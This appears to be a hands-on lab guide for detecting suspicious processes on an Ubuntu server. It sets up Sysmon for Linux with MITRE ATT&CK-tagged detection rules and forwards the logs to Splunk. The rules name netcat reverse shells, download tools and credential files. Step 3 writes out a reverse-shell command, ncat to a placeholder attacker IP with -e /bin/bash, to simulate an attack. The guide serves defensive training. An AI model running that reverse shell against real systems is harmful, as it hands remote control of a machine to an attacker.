**Objective**: Detect and investigate suspicious processes running on an Ubuntu server using practical tools like Sysmon for Linux and Splunk. Simulate an attack by running a reverse shell.

- **Detailed level**: Full
- **Difficulty level**: Medium

---

### **Step-by-Step Guide**

---

### **Step 1: Prerequisites**

1. **Ubuntu Server** with sudo privileges.
2. **Splunk Universal Forwarder** installed and configured to forward logs.
3. **Sysmon for Linux** installed for monitoring process creation.

---

### **Step 2: Install Sysmon for Linux**

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Recommended base config: MSTIC Sysmon Config](https://raw.githubusercontent.com/microsoft/MSTIC-Sysmon/main/linux/configs/main.xml)

1. **Install Sysmon**:

   # Add Microsoft repository key

   ```sh
   wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
   sudo dpkg -i packages-microsoft-prod.deb
   ```

   # Update and install Sysmon for Linux

```
 sudo apt-get update
 sudo apt-get install sysmonforlinux -y
```

2. **Configure Sysmon**:

   - Create a Sysmon configuration file:

```bash

 sudo nano sysmon-config.xml

```

- This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.

- Add the following content to monitor process creation:

```
<!--
 SysmonForLinux

 Copyright (c) Microsoft Corporation

 All rights reserved.

 MIT License

 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without
restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom th
e Software is furnished to do so, subject to the following conditions:

 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

 THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE
AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISI
NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-->
<Sysmon schemaversion="4.81">
<EventFiltering>
 <!-- Event ID 1 == ProcessCreate -->
 <RuleGroup name="" groupRelation="or">
   <ProcessCreate onmatch="include">
     <Rule name="TechniqueID=T1021.004,TechniqueName=Remote Services: SSH" groupRelation="and">
       <Image condition="end with">ssh</Image>
       <CommandLine condition="contains">ConnectTimeout=</CommandLine>
       <CommandLine condition="contains">BatchMode=yes</CommandLine>
       <CommandLine condition="contains">StrictHostKeyChecking=no</CommandLine>
       <CommandLine condition="contains any">wget;curl</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1027.001,TechniqueName=Obfuscated Files or Information: Binary Padding" groupRelation="and">
       <Image condition="is">/bin/dd</Image>
       <CommandLine condition="contains all">dd;if=</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer - Ncat" groupRelation="and">
         <Image condition="end with">ncat</Image>
         <Image condition="end with">nc</Image>
         <CommandLine condition="contains">-e</CommandLine> <!-- Detects reverse shell option -->
         <CommandLine condition="contains any">/bin/bash;/bin/sh;/bin/dash</CommandLine> <!-- Shell execution -->
     </Rule>

     <Rule name="TechniqueID=T1033,TechniqueName=System Owner/User Discovery" groupRelation="or">
       <CommandLine condition="contains">/var/run/utmp</CommandLine>
       <CommandLine condition="contains">/var/log/btmp</CommandLine>
       <CommandLine condition="contains">/var/log/wtmp</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
       <Image condition="end with">crontab</Image>
     </Rule>
     <Rule name="TechniqueID=T1059.004,TechniqueName=Command and Scripting Interpreter: Unix Shell" groupRelation="or">
       <Image condition="end with">/bin/bash</Image>
       <Image condition="end with">/bin/dash</Image>
       <Image condition="end with">/bin/sh</Image>
     </Rule>
     <Rule name="TechniqueID=T1070.006,TechniqueName=Indicator Removal on Host: Timestomp" groupRelation="and">
       <Image condition="is">/bin/touch</Image>
       <CommandLine condition="contains any">-r;--reference;-t;--time</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1087.001,TechniqueName=Account Discovery: Local Account" groupRelation="or">
       <CommandLine condition="contains">/etc/passwd</CommandLine>
       <CommandLine condition="contains">/etc/sudoers</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
       <Image condition="end with">wget</Image>
       <Image condition="end with">curl</Image>
       <Image condition="end with">ftpget</Image>
       <Image condition="end with">tftp</Image>
       <Image condition="end with">lwp-download</Image>
     </Rule>
     <Rule name="TechniqueID=T1123,TechniqueName=Audio Capture" groupRelation="and">
       <Image condition="contains">/bin/aplay</Image>
       <CommandLine condition="contains">arecord</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1136.001,TechniqueName=Create Account: Local Account" groupRelation="or">
       <Image condition="end with">useradd</Image>
       <Image condition="end with">adduser</Image>
     </Rule>
     <Rule name="TechniqueID=T1203,TechniqueName=Exploitation for Client Execution" groupRelation="and">
       <User condition="is">root</User>
       <LogonId condition="is">0</LogonId>
       <CurrentDirectory condition="is">/var/opt/microsoft/scx/tmp</CurrentDirectory>
       <CommandLine condition="contains">/bin/sh</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1485,TechniqueName=Data Destruction" groupRelation="and">
       <Image condition="is">/bin/dd</Image>
       <CommandLine condition="contains all">dd;of=;if=</CommandLine>
       <CommandLine condition="contains any">if=/dev/zero;if=/dev/null</CommandLine>
     </Rule>
     <Rule name="TechniqueID=T1505.003,TechniqueName=Server Software Component: Web Shell" groupRelation="and">
       <Image condition="contains any">whoami;ifconfig;/usr/bin/ip;/bin/uname</Image>
       <ParentImage condition="contains any">httpd;lighttpd;nginx;apache2;node;dash</ParentImage>
     </Rule>
     <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
       <Image condition="end with">systemd</Image>
     </Rule>
     <Rule name="TechniqueID=T1548.001,TechniqueName=Abuse Elevation Control Mechanism: Setuid and Setgid" groupRelation="or">
       <Image condition="end with">chmod</Image>
       <Image condition="end with">chown</Image>
       <Image condition="end with">fchmod</Image>
       <Image condition="end with">fchmodat</Image>
       <Image condition="end with">fchown</Image>
       <Image condition="end with">fchownat</Image>
       <Image condition="end with">fremovexattr</Image>
       <Image condition="end with">fsetxattr</Image>
       <Image condition="end with">lchown</Image>
       <Image condition="end with">lremovexattr</Image>
       <Image condition="end with">lsetxattr</Image>
       <Image condition="end with">removexattr</Image>
       <Image condition="end with">setuid</Image>
       <Image condition="end with">setgid</Image>
       <Image condition="end with">setreuid</Image>
       <Image condition="end with">setregid</Image>
     </Rule>
   </ProcessCreate>
 </RuleGroup>
 <!-- Event ID 3 == NetworkConnect Detected -->
 <RuleGroup name="" groupRelation="or">
   <NetworkConnect onmatch="include">
     <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
       <Image condition="end with">wget</Image>
       <Image condition="end with">curl</Image>
       <Image condition="end with">ftpget</Image>
       <Image condition="end with">tftp</Image>
       <Image condition="end with">lwp-download</Image>
     </Rule>
   </NetworkConnect>
 </RuleGroup>
 <!-- Event ID 5 == ProcessTerminate -->
 <RuleGroup name="" groupRelation="or">
   <ProcessTerminate onmatch="include" />
 </RuleGroup>
 <!-- Event ID 9 == RawAccessRead -->
 <RuleGroup name="" groupRelation="or">
   <RawAccessRead onmatch="include" />
 </RuleGroup>
 <!-- Event ID 11 == FileCreate -->
 <RuleGroup name="" groupRelation="or">
   <FileCreate onmatch="include">
     <Rule name="TechniqueID=T1037,TechniqueName=Boot or Logon Initialization Scripts" groupRelation="or">
       <TargetFilename condition="begin with">/etc/init/</TargetFilename>
       <TargetFilename condition="begin with">/etc/init.d/</TargetFilename>
       <TargetFilename condition="begin with">/etc/rc.d/</TargetFilename>
     </Rule>
     <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
       <TargetFilename condition="is">/etc/cron.allow</TargetFilename>
       <TargetFilename condition="is">/etc/cron.deny</TargetFilename>
       <TargetFilename condition="is">/etc/crontab</TargetFilename>
       <TargetFilename condition="begin with">/etc/cron.d/</TargetFilename>
       <TargetFilename condition="begin with">/etc/cron.daily/</TargetFilename>
       <TargetFilename condition="begin with">/etc/cron.hourly/</TargetFilename>
       <TargetFilename condition="begin with">/etc/cron.monthly/</TargetFilename>
       <TargetFilename condition="begin with">/etc/cron.weekly/</TargetFilename>
       <TargetFilename condition="begin with">/var/spool/cron/crontabs/</TargetFilename>
     </Rule>
     <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
       <Image condition="end with">wget</Image>
       <Image condition="end with">curl</Image>
       <Image condition="end with">ftpget</Image>
       <Image condition="end with">tftp</Image>
       <Image condition="end with">lwp-download</Image>
     </Rule>
     <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
       <TargetFilename condition="begin with">/etc/systemd/system</TargetFilename>
       <TargetFilename condition="begin with">/usr/lib/systemd/system</TargetFilename>
       <TargetFilename condition="begin with">/run/systemd/system/</TargetFilename>
       <TargetFilename condition="contains">/systemd/user/</TargetFilename>
     </Rule>
   </FileCreate>
 </RuleGroup>
 <!--Event ID 23 == FileDelete -->
 <RuleGroup name="" groupRelation="or">
   <FileDelete onmatch="include" />
 </RuleGroup>
</EventFiltering>
</Sysmon>
```

- Save and restart Sysmon:

  ```bash

  sudo sysmon -i sysmon-config.xml

  sudo systemctl restart sysmon
  sudo systemctl status sysmon

  ```

---

### **Step 3: Simulate a Suspicious Process Execution**

1. **Simulate a Reverse Shell**:

   - On the **attacking machine**, use Netcat to create a listener:

     ```bash
     sudo apt install ncat net-tools -y
     ncat -lvnp 4444

     ```

   - On the **target server**, execute the reverse shell:

     ```bash

     ```

   sudo apt install ncat net-tools -y
   ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash

   ```

   - Replace `<attacker-ip>` with the IP address of the attacking machine.

   ```

2. **Verify the Process Execution on Victim machine**:

   - List running processes on the Ubuntu server:

   ```bash

   sudo lsof -i :4444
   netstat -tulnp | grep 4444
   ps -ef | grep ncat

   ```

---

### **Step 4: Configure Splunk for Log Monitoring**

1. **Set up Sysmon logs forwarding**:

   - Configure Splunk Universal Forwarder to monitor Sysmon logs:

     ```bash

     sudo nano /opt/splunkforwarder/etc/system/local/inputs.conf

     ```

   - Add the following configuration:

     ```

     [monitor:///var/log/sysmon.log]
     sourcetype = syslog
     index = linux_os_logs

     ```

   - Save and restart the Splunk Universal Forwarder:

     ```bash

     sudo /opt/splunkforwarder/bin/splunk restart

     ```

2. **Verify Log Forwarding**:

   - Check if logs are visible in Splunk using this query:

     ```

     ```

   index="linux_os_logs" sourcetype=syslog

   ```

    ![Splunk](/Splunk_Ubuntu/assets/03.png)
   ```

---

### **Step 5: Analyze Logs in Splunk**

1. **Detect Suspicious Processes**:

   - Run a query to find all process creation events:

     ```

     ```

   index="linux_os_logs" process=sysmon TechniqueName="Command" "ncat"

   ```

   ![Splunk](/Splunk_Ubuntu/assets/04.png)

   ```

2. **Visualize Process Trends**:
   - Create a dashboard in Splunk to monitor:
     - Frequently executed processes.
     - Unusual parent-child relationships.

### **Step 6: Incident Response**

1. **Kill the Malicious Process**:

   - Identify the process ID (PID):

     ```bash
     ps aux | grep bash
     sudo kill <pid>
     sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP

     ```

2. **Investigate the Source**:
   - Analyze Sysmon logs in Splunk for:
     - The process owner.
     - Commands executed by the process.
     - Network connections initiated.
